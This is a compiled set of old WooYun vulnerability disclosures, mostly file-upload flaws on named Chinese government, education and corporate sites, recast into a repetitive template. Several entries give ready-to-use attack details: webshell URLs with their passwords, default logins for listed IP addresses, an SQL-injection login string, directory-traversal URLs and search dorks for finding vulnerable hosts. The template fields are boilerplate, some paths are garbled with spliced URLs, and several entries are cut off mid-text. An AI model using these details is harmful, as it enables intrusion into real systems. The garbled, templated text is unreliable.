2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们是搞这个的，应该懂吧·····
---

---
### [wooyun-2012-09466] 邮易购客服系统任意文件上传漏洞
**厂商**: 邮易购 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: /home/ecccs/web/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/screenImagesSave.php文件保存文件名时为：filename GET的参数

**POC**: 上传成功返回信息如上传的是脚本文件，可控制开服务器

**绕过**: 直接利用

**修复**: 联系用友对ICC客服系统进行升级
---

---
### [wooyun-2014-078374] 新东方某站存在上传漏洞
**厂商**: 新东方 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: fckeditor编辑器一枚。只能上传txt编辑器地址：http://un.koolearn.com/fckeditor/editor/filemanager/connectors/test.html#

**POC**: 漏洞证明

**绕过**: 直接利用

**修复**: 你懂滴~
---

---
### [wooyun-2014-062204] 某教育系统漏洞通用漏洞,错的离谱可前台传木马
**厂商**: pantosoft.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 还有什么说的,前台直接传木马,都不用想的.

**POC**: 谷歌搜索inurl:InstantMessage/Dialog如图:共有学校:http://nanhu2.com.cn/InstantMessage/Dialog.aspx       (上海市南湖职业学校二分校)http://www.gxjdgc.com/InstantMessage/Dialog           (广西机电工程学校)http://www.shjtxx.net/InstantMessage/Dialog.aspx      (上海市交通学校)http://www.scp.edu.cn/Committee/InstantMessage/Dialog (上海交通职业技术学院)

**绕过**: 直接利用

**修复**: 你们更专业求礼物!!!!!
---

---
### [wooyun-2014-080430] BOBO官网英文站存在任意文件上传
**厂商**: BOBO官网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 又是FCKeditor编辑器...英文分站貌似跟主站用的同个源码发现也被同个人给搞了无奈又走下后门...密码依旧是 dkeeyy看下IP跟主站不在一个服务器上服务器权限前面一篇已经拿下了，应该还在审核就不贴地址了

**POC**: shell:http://en.bobobaby.com.cn/uploadfile/file/2.aspx

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2011-02192] foxmail server多个漏洞
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Foxmail Server是专为国人设计的邮件服务器软件,提供多种邮件服务，用户可以用Foxmail、Outlook等客户端软件收发邮件，也可以在美观易用的中文Web界面上登陆处理邮件。user/download.asp存在任意文件下载漏洞user/filesMain.asp?fmFileType=image文件上传漏洞由于文件上传到的目录是虚拟目录,所以不可以执行。但是我们通过上传的变量修改成../../../跳转到web目录

**POC**: Foxmail Server是专为国人设计的邮件服务器软件,提供多种邮件服务，用户可以用Foxmail、Outlook等客户端软件收发邮件，也可以在美观易用的中文Web界面上登陆处理邮件。user/download.asp存在任意文件下载漏洞user/filesMain.asp?fmFileType=image文件上传漏洞由于文件上传到的目录是虚拟目录,所以不可以执行。但是我们通过上传的变量修改成../../../跳转到web目录

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2015-0104068] 某掌上医院系统通用型任意文件上传
**厂商**: 智业软件股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 今天去医院看到个掌上医院的二维码，就扫了一下，然后就有了下面的事情。智业软件成立于1997年，是一家拥有17年以上专业研发和服务背景，专注于提供医疗卫生信息化领域系统解决方案的企业。以下以福鼎市医院为例Android公众版：Http://36.250.159.106:5155/mhpublic.apkAndroid医护版：Http://36.250.159.106:5156/mhdoctor.apk1#后台未授权访问http://*/adminHttp://36.250.159.106:5155/admin我对该站进行了端口扫描，发现http://36.250.159.106:5255/adminhttp://36.250.159.106:5256/adminhttp://36.250.159.106:9000/admin2#任意文件上传在用户维护的编辑头像处，存在任意文件上传，是直接上传

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 接口、后台该放内网的还是要放内网接口调用加个key什么的上传点过滤一下吧，最少上传目录权限限制一下
---

---
### [wooyun-2015-0112859] 上海市新闻出版局官网存在任意文件上传及文件遍历漏洞
**厂商**: 上海市新闻出版局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上海市新闻出版局地址：https://cbj.sh.gov.cn/index.jsp问题原因，站点使用的fck编辑器配置不当fck目录遍历：https://cbj.sh.gov.cn/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=../

**POC**: 文件上传：https://cbj.sh.gov.cn/cms/FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&Connector=https://cbj.sh.gov.cn/editor/filemanager/browser/default/connectors/jsp/connector直接上传jsp文件shell地址：https://cbj.sh.gov.cn/UserFiles/Image/01test10.jsp密码：520o520以上

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2012-012529] 方维社会化分享系统一句话漏洞
**厂商**: 方维 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 个人简介过滤不严格，将用户提交的代码保存下来，模板缓存后再次读取时直接执行用户代码！

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤个人简介。检查其他地方同类漏洞！
---

---
### [wooyun-2013-017644] 福建省国资委可被入侵
**厂商**: 福建省国资委 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 这个是上传页面，老洞了。利用解析漏洞即可。http://www.fjgzw.gov.cn/admin/uploadfile/2013/01/21/help.asp;1.jpg

**POC**: 服务器懒得去搞。别人搞过了。圈圈的应该是入侵者QQ

**绕过**: 直接利用

**修复**: 依然刷rank·老洞了 应该知道怎么补
---

---
### [wooyun-2015-0137397] MaticsoftSNS 1.9版本任意文件上传漏洞
**厂商**: 动软卓越（北京）科技有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在一次渗透测试发现存在任意文件上传，是一个通用的系统。MaticsoftSNS 1.9版本（目测最新版）以及动软卓越商城1.9.8以下版本存在任意文件上传。如所说的案例分别含MaticsoftSNS 1.9版本 以及 动软卓越商城1.9.8版都存漏洞文件。http://www.gannanxian.org/CMSUploadFile.aspxhttp://bink.gq/CMSUploadFile.aspxhttp://bink.gq/CMSUploadFile.aspxhttp://tp.huaxi88.com/CMSUploadFile.aspxhttp://sns2.maticsoft.cn/CMSUploadFile.aspxhttp://sns3.maticsoft.cn/CMSUploadFile.aspxhttp://www.weichimei.com/CMSUploadFi

**POC**: 实现了成功的上传中注意的文件位置是没有{0}符合的

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-024539] 江苏卫视分站任意上传可提权可渗透
**厂商**: 江苏卫视 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我就不多少了,直接上图片吧。。。http://hd.jstv.com/xiaohua/regist.aspx#我们上传一句话然后抓包。嗯。。。成功

**POC**: 提权的话我是找到了sa第一次,所以请见谅！！

**绕过**: 直接利用

**修复**: 你懂得。。过滤什么的。。
---

---
### [wooyun-2014-089055] 菏泽数字城市综合应用平台社会化服务系统--fck编辑器漏洞
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 无意中对蛋疼闲着没事做看了下新闻，跳出了这个站的新闻打开一个是个gov的。然后就有下面的检测了。扫了下目录竟然出现FCK编辑器的连接http://www.hzcg.gov.cn/fckeditor/editor/fckdialog.html，而且没有做什么设置可以直接上传iis的解析漏洞格式上面发现好多的马！！！

**POC**: 操刀上http://www.hzcg.gov.cn//Files/File/1.asp;.cer密码sb

**绕过**: 直接利用

**修复**: 1、把路劲修改掉2、权限设置严格点3、把安全做好  哈哈
---

---
### [wooyun-2016-0180250] 吉林交通职业技术学院某站后台弱口令/FCKeditor上传
**厂商**: 吉林交通职业技术学院 | **年份**: 2016 | **类型**: 后台弱口令

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://139.210.101.102:8888/2013yangcaihttp://139.210.101.102:8888/2013yangcai/Edit/editor/filemanager/browser/default/browser.html?Type=File&Connector=http://139.210.101.102:8888/2013yangcai/Edit/editor/filemanager/connectors/asp/connector.asp发现FCKeditor上传链接一枚各种上传方法试了一下，传不上去asp然而，后台还是弱口令http://139.210.101.102:8888/2013yangcai/admin/admin_index.aspadmin admin后台还有备份功能 路径还可控制先通过FCKeditor传上去再利用备份功能

**POC**: 一句话木马连接webshell

**绕过**: 直接利用

**修复**: 修改密码 关闭fckeditor上传功能
---

---
### [wooyun-2015-092138] 安徽省公路管理网站任意文件写入漏洞
**厂商**: 安徽省公路管理局 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://60.173.215.11/wcm/ 是trs wcm 5.2根据WooYun: TRS WCM 6.X系统任意文件写入漏洞照葫芦画瓢http://60.173.215.11/wcm/services/trs:templateservicefacade?wsdl 漏洞存在

**POC**: 先打开soapUI，建个新项目，输入http://60.173.215.11/wcm/services/trs:templateservicefacade?wsdl先用writeFile随便提交<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><ns1:writeFile

**绕过**: 直接利用

**修复**: 不是说13年就出补丁了吗，怎么还没补
---

---
### [wooyun-2016-0168911] 中建八局某系统弱口令+任意用户登录+多处未授权访问
**厂商**: 中建八局 | **年份**: 2016 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中建八局项目管理信息系统，用户弱口令+任意用户登录+任意文件上传http://**.**.**.**/1.弱口令：803-2014-001-T-N /111803-2014-002-T-N /111...   ...   ...803-2014-040-T-N /1112.任意用户登录：admin'or'1'='1

**POC**: 3.N处未授权：(太多了，就不一一列出了)http://**.**.**.**/HQ/index.htmhttp://**.**.**.**/AllUsed/LinkList.aspxhttp://**.**.**.**/HQ/GCXMWeb/xmsgdw.asp这里应该可以看视频

**绕过**: 直接利用

**修复**: 联系开发的吧
---

---
### [wooyun-2014-058250] U-mail后台任意文件上传漏洞（测试version=20100326）
**厂商**: U-mail | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 演示案例为：湖南省农业综合开发办公室http://220.168.30.69:8080/webmail/admin/index.php用户admin密码123456该公网IP220.168.30.69映射了很多web服务，如湖南省财政厅下属的会计考试报名管理等系统http://220.168.30.69:6011/collectdata/http://220.168.30.69:6020/hnkj/wb/space/IndexAction.do?method=index等等系统，由于只是发现和报告问题，并没有进一步测试内部联通性，请审核人员协调处置。测试中发现该邮箱服务器已被控制，进而打算利用该邮箱服务器控制会计报名系统

**POC**: 利用admin/123456登录http://220.168.30.69:8080/webmail/admin/index.php进入信纸管理点击添加或者修改即可无限制上传webshell---------------------------------------------------------------------上面是我在测试中摸索处的办法，可我发现已经有人在早我一个月的时间已经控制了该服务器，并打算攻击会计管理系统。还发现一个2013-09-04上传的一句话。绿色为13年上传的一句话蓝色为我上传的一句话红色为早我一个月的webshell粉丝为早我一个月的webshell做的nam

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-015489] 中国联通分站上传过滤不严，导致网站沦陷，数据泄漏
**厂商**: 中国联通 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 表示发现上传漏洞，过滤不严。导致数据全部泄漏。。

**POC**: 上传地址：http://www.02160899666.com/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html可直接修改木马成asa、.asp;.jpg等扩展名上传。，导致最后直接沦陷。

**绕过**: 直接利用

**修复**: 删除上传地址或过滤asa等上传文件扩展名。
---

---
### [wooyun-2013-036179] Wolf CMS Login In Back File Upload Bypass Vulnerabilitie
**厂商**: wolfcms | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Login In Back File Upload Bypass Vulnerabilitie。后台文件上传功能有2个小模块：新建文件夹和本地上传文件，如下：新建文件夹（可以给文件夹添加后缀.php），这个文件夹目录下面的文件可以当成php脚本文件执行；本地上传文件（没有对文件后缀进行限制）；

**POC**: 源代码审计的部分就不贴图了。自己去下载看看这部分的代码吧。

**绕过**: 直接利用

**修复**: YOU KNOW.
---

---
### [wooyun-2012-07337] 济南市国税局纳税服务平台任意文件上传
**厂商**: 济南市国税局 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 使用旧版用友ICC，任意文件上传http://60.208.91.43/5107https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/uploadFlash.php详见：WooYun: 用友ICC网站客服系统远程代码执行漏洞

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检查下
---

---
### [wooyun-2015-0105080] 某数字化校园平台通用任意文件上传#4
**厂商**: Cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: inurl:EduPlate\PersonBlog\就拿一个站举例子吧

**POC**: http://zpxx.nh.edu.sh.cn/eduplate/PersonBlog//ftb.insertFile.aspxhttp://tywx.mhedu.sh.cn/EduPlate/PersonBlog//ftb.insertFile.aspxhttp://www.peijia.com/EduPlate/PersonBlog/ftb.insertFile.aspxhttp://www.pjsyxx.com/EduPlate/PersonBlog/ftb.insertFile.aspxhttp://www.whei.cn//EduPlate/PersonBlog/ftb.inser

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0115088] 职航在线任意上传漏洞
**厂商**: 职航在线 | **年份**: 2015 | **类型**: 

**元思考**: 触发信号: 上传功能

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在这个网页上http://nju.fitoo.com/Match/jiangsu/apply.aspx随意注册一个账号（邮箱验证），信息随便填写，那就用强大的163邮箱呗。链接可以看出加了地址识别功能，知道在哪个地方。接下随便注册了，这个验证机制就是对学号中的特殊字符做了限制功能，其他随意。然后随便上传文件参加所谓的比赛啦，我就会这个，来来来，服务器在召唤你。

**POC**: 然后随便上传文件参加所谓的比赛啦，我就会这个，来来来，服务器在召唤你。竟然上传成功了，但是不知道如何找到这个文件，找其他亮点吧。竟然上传成功了，但是不知道如何找到这个文件，找其他亮点吧。bingo,excellent!!!数据库没连接上，甚是郁闷！！！，就到这吧。

**绕过**: 直接利用

**修复**: 对格式进行验证
---

---
### [wooyun-2015-0153205] 新疆维吾尔自治区交通运输厅存在文件遍历任意上传
**厂商**: 新疆维吾尔自治区交通运输厅 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 。。。。。。。。。。。http://**.**.**.**/

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改权限
---

---
### [wooyun-2012-010701] 甘肃电信编辑器任意文件上传漏洞
**厂商**: 甘肃电信 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://www.gansutelecom.com/ckfinder/ckfinder.html?

**POC**: 甘肃电信编辑器漏洞现在已拿下SHELL是一件成功的入侵事件

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2012-015650] 华安保险JBoss弱口令及远程代码执行
**厂商**: 华安保险 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华安保险多个系统存在远程代码执行漏洞，同时存在敏感信息泄漏。华安财产保险股份有限公司(以下简称华安保险)是经中国人民银行批准，于1996年10月18日正式创立的一家专业性保险公司，总部设于深圳，主要经营各种财产险、责任险、信用保证险、农业险、意外伤害险和短期健康险业务。

**POC**: URL:https://www.sinosafe.com.cn:9080/https://www.sinosafe.com.cn:18080/http://www.sinosafe.com.cn:16080/其中一个默认密码为admin/admin,其他无密码验证。敏感信息泄露:远程代码执行：shell:

**绕过**: 直接利用

**修复**: 攻城狮会。
---

---
### [wooyun-2013-037704] 4399相册的一处越权上传
**厂商**: 4399小游戏 | **年份**: 2013 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 往相册里传了一朵耀眼的红菊花.鞭鸡一下确定把fid改成管理员的然后提交咦.我的大菊花呢，肿么木有了到管理员的相册里一看,原来是你偷了我的大菊花

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0157662] 某Zoomla系统漏洞导致服务器可控（已登录Zoomla公司邮箱和官方老论坛管理员帐号）
**厂商**: 逐浪CMS | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 通过http://www.njzxw.cn/Plugins/swfFileUpload/UploadHandler.ashx 可构造上传表单提交aspx马到服务器，原理可参考：WooYun: 逐浪cms 2.4某处任意文件上传（不需要登录）通过查看，该应用所属权限较高，可以控制该服务器挂的几十个大小网站，发现其中有一个bbs.zoomla.cn的官方老版论坛也在该服务器，并且配置公司邮箱账户密码：该密码可登录mail.hx008.com ，mail.zoomla.cn的官方账户:web，分别是逐浪和华夏互联的官方邮箱：经过查看，bbs.zoomla.cn论坛已转移到http://club.zoomla.cn/，但账户密码应该没有换把?查看bbs的账户有3W多条：用bbs系统的账户密码，成功登录club的一个管理账户：

**POC**: 网站是Zoomla CMS系统，服务器应该也归属该公司旗下的华夏互联

**绕过**: 直接利用

**修复**: 各个网站更新最新版CMS系统。服务器设置各个网站权限级别，网站配置权限只可查看本网站文件。
---

---
### [wooyun-2014-061948] 某市安全生产监督管理局上传漏洞
**厂商**: 安庆市安全生产监督管理局 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.aqanhuisafety.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jsp直接上传jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制上传jsp
---

---
### [wooyun-2015-0143855] 某人才管理系统通用型漏洞打包
**厂商**: 北京宏景世纪软件有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 北京宏景世纪软件股份有限公司:http://**.**.**.**/关键字:inurl:hireNetPortal/search_zp_position.do该套建站系统某版本使用了fck编辑器，问题1#目录遍历宁波轨道交通http://**.**.**.**/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/../中国建筑科学研究院**.**.**.**/fckeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=

**POC**: 2#任意文件上传（上传jspx）http://**.**.**.**/fckeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector一句话：http://**.**.**.**/UserFiles/File/index.jspx密码：023其它中国建筑科学研究院一句话：**.**.**.**/UserFiles/File/wpp.jspx密码：023中国人民解放军空军总医院**.**.**.**/UserFiles/wpp.jspx（023）北京电影学院**.**.**.*

**绕过**: 直接利用

**修复**: 正确配置fck编辑器，删除shell
---

---
### [wooyun-2012-07619] 甘肃联通历目录漏洞加编辑器漏洞
**厂商**: 甘肃联通历目录漏洞加编辑器上传漏洞 | **年份**: 2012 | **类型**: 应用配置错误

**元思考**: 触发信号: 上传功能

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 甘肃联通历目录漏洞加编辑器上传漏洞漏洞  本人传一句话成功用菜刀连接成功

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0109298] 华为某统计平台存在任意文件上传漏洞
**厂商**: 华为技术有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 目标地址：http://221.4.104.72:8080/首先注册一个叫wooyun的帐号，密码也是wooyun注册成功了自动进入系统

**POC**: 点击关于我们可以看到平台的介绍关于我们XPA统计平台做为统计数据的工具，已向XPA各产品提供了成熟的数据收集能力，现在，XPA统计平台拥有可定制的数据统计功能，无论在线离线都可以统计，支持实时统计，丰富的图表展现形式等特性。为什么认为系统是华为的，是因为在意见反馈处存在任意文件上传漏洞上传后抓包，修改文件后缀这里我试了比较多个shell，大部分都无效，貌似有判断登录状态，最后找了个可以访问，但仍然有点问题的马http://221.4.104.72:8080//snapShot/3987bc5ce2e44146a32de7be644251e8/wooyun.jsp应该可以证明存在任意文件上传

**绕过**: 直接利用

**修复**: 过滤吧
---

---
### [wooyun-2014-063611] 迅雷网络2014校园招聘存在任意上传漏洞（可修改主页）
**厂商**: 迅雷 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注册然后..任意上传..这都是不是亮点..然后我们burp抓包一下看上传Content-Disposition: form-data; name="resumeid"可以定义目录+文件名然后...再然后..还可以这样玩...我不敢这样玩，我不是helen 不要打我..

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 我不是专业的...你们懂得
---

---
### [wooyun-2013-025463] 杜集某教育网站点目录遍历漏洞，数据库暴露，
**厂商**: 杜集区教育局 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1. 目录遍历漏洞，数据库文件可以自由下载2. 数据库文件一览无余，密码明文保存3. 利用数据库中爆出的用户和密码，进入后台验证，得到后台所有权限4. 好像还有一个上传漏洞，我再看看

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 强化服务器的权限配置等等，修复我不行
---

---
### [wooyun-2014-055532] 康赛-高校网上缴费系统存在任意文件上传漏洞
**厂商**: 康赛-高校网上缴费系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在这个系统里，每个学生有个初始账号， 密码统一默认为6个0（可能每个高校初始密码不一样，不过，都在当前页面说明了初始密码）。 随便在某个高校的系统里，找个该校的学生的学号，然后根据默认的密码登录， 在个人信息的地方，有个头像的上传地方，我们可以上传头像图片，初始情况 只允许 （jpg/gif/png）的图片我们可以利用抓包上传，或者截断上传，系统验证文本类型是在客户端验证的。没有在服务器验证。这样我们可以控制，传输的文本类型。可以改成asp,aspx,php的木马，该系统只验证了jsp的脚本

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 在服务端验证控制文本的类型，进制传输，接受非法脚本文件
---

---
### [wooyun-2014-062140] Discuz! <=2.5 csrf防御绕过
**厂商**: Discuz! | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其实还是	drops文章《上传文件的陷阱》带来的问题。dz2.5以下版本修改头像处未检查图片文件的合法性，可以上传.jpg后缀的swf文件。使用这个swf文件发起恶意请求读取页面源码就能获取到formhash 有formhash之后。。想干嘛就干嘛了具体文件/uc_server/control/user.php 281行onuploadavatar函数$imgtype = array(1 => '.gif', 2 => '.jpg', 3 => '.png');只检查了后缀而不像3.0以上用库检查了图片格式

**POC**: 步骤1、新建一个获取页面源码 提取formhash 然后用formhash发送添加副站长请求的swf，保存为.jpg后缀2、注册一个账号，去/home.php?mod=spacecp&ac=avatar上传上一步生成的.jpg后缀的swf文件并抓包 上传后的地址应该是http://192.168.1.104/uc_server/data/tmp/upload{uid}.jpg这样的3、新建一个html页面，把上一步拿到的头像地址当作flash加载到页面。4、引诱管理员访问这个html页面，就会在后台把你的账号添加为副站长

**绕过**: 直接利用

**修复**: 把3.0 3.1的检查代码搬过来吧
---

---
### [wooyun-2012-08834] a.sop电子政务公共服务支撑与管理平台-在线直播系统任意文件上传漏洞
**厂商**: 航天四创 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口, 上传功能, 后台管理

